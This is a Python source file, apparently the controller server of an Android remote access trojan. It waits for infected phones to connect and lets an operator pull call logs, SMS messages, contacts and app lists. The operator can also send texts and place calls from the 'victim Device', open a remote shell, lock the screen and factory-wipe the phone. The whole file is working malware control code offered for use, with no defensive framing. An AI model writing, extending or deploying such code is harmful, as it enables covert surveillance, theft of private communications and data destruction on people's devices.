import socket
import sys
from threading import Thread
from time import sleep

port = 22222
dumpPath = "/sdcard/"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('', port))

server.listen()
print("listening for connections...")

all_clients = {}

isSessionAlive = False


def stable_recv(listen_client):
    total_data = []
    while True:
        try:
            data = listen_client.recv(1024).decode(errors='ignore')
            if not data:
                total_data.append("connection closed in between !")
                break
            else:
                if "EOFExceptionReceived" in data:
                    total_data.append(data.replace("EOFExceptionReceived", ""))
                    break
                else:
                    total_data.append(data)
        except Exception as e:
            print(e)
            pass

    return ''.join(total_data)


def help():
    print("getCallLogs - get all call logs"
          "\ngetSmsLogs-<type> - type(inbox|sent|draft) - get all sms logs"
          "\ngetApps - list all apps Installed on device"
          "\ngetContacts - get Contacts list from device"
          "\ngetInfo - get Device Info"
          "\nsendSms <phoneNumber> <message> - send Message from victim Device"
          "\ncallPhone <phoneNumber> - Initiate call to target number"
          "\nshell - gets the target Device shell"
          "\nlockDevice - Turns off Device screen (Admin)"
          "\nwipePhoneData-adhirajRanjan - Resets Device to Factory Settings (Admin)")


def stable_send(client, Cmd):
    global isSessionAlive
    try:
        data = Cmd.encode('UTF-8')
        client.send(len(data).to_bytes(2, byteorder='big'))
        client.send(data)
    except:
        print(all_clients[client], 'disconnected !')
        del all_clients[client]
        isSessionAlive = False


def startSession(client):
    global isSessionAlive
    client_name = all_clients[client]
    while isSessionAlive:
        sendData = input(" > ")
        if sendData == "exit":
            break
        elif sendData == "help":
            help()
        elif sendData == "getCallLogs":
            stable_send(client, sendData)
            print("[ info ] requesting call logs -")
            callLogs = stable_recv(client)
            with open(f"{dumpPath}{client_name}-callLogs.txt", "w+") as f:
                f.write(callLogs)
            print(f"[ success ] saved at {dumpPath}{client_name}-callLogs.txt")

        elif sendData.startswith("getSmsLogs"):
            try:
                typE = sendData.split("-")[1]
            except:
                print("[ info ] Wrong data format")
                continue
            stable_send(client, sendData)
            print("[ info ] requesting sms logs -")
            smsLogs = stable_recv(client)
            with open(f"{dumpPath}{client_name}-smsLogs{typE}.txt", "w+") as f:
                f.write(smsLogs)
            print(f"[ success ] saved at {dumpPath}{client_name}-smsLogs{typE}.txt")

        elif sendData == "getContacts":
            print("[ info ] requesting contacts list -")
            stable_send(client, sendData)
            contacts = stable_recv(client)
            with open(f"{dumpPath}{client_name}-contacts.txt", "w+") as f:
                f.write(contacts)
            print(f"[ success ] saved at {dumpPath}{client_name}-contacts.txt")

        elif sendData == "getApps":
            print("[ info ] requesting apps list -")
            stable_send(client, sendData)
            apps = stable_recv(client)
            with open(f"{dumpPath}{client_name}-apps.txt", "w+") as f:
                f.write(apps)
            print(f"[ success ] saved at {dumpPath}{client_name}-apps.txt")
        elif sendData == "shell":
            stable_send(client, sendData)
            response = stable_recv(client)
            print(response)

        else:
            stable_send(client, sendData)
            msg = stable_recv(client)
            print(msg)


def handle_devices():
    while True:
        getDevice = input("SDevice > ")
        if getDevice == "show":
            count = 1
            for client in all_clients:
                print(f"[ {count} ]  {all_clients[client]}")
                count += 1
        elif "run " in getDevice:
            try:
                index = int(getDevice.split(' ')[-1]) - 1
                startSession(tuple(all_clients.items())[index][0])
            except:
                print(f"[ info ] No Device at index {index}")
        elif getDevice == "exit":
            server.close()
            sys.exit()
        else:
            print("[ error ] command not found!")


def handle_new_client(client):
    global isSessionAlive
    client_name = stable_recv(client)
    all_clients[client] = client_name
    print(f"[ + ] Received a connection from {client_name}")
    if not isSessionAlive:
        isSessionAlive = True
        Thread(target=handle_devices).start()


def check_connection():
    message = "isConnectionAlive".encode('UTF-8')
    while True:
        sleep(3)
        try:
            for eachC in all_clients.copy():
                stable_send(eachC, message)
        except:
            continue


Thread(target=check_connection).start()

while True:
    try:
        client, address = server.accept()
        Thread(target=handle_new_client, args=[client]).start()
    except:
        server.close()
        break
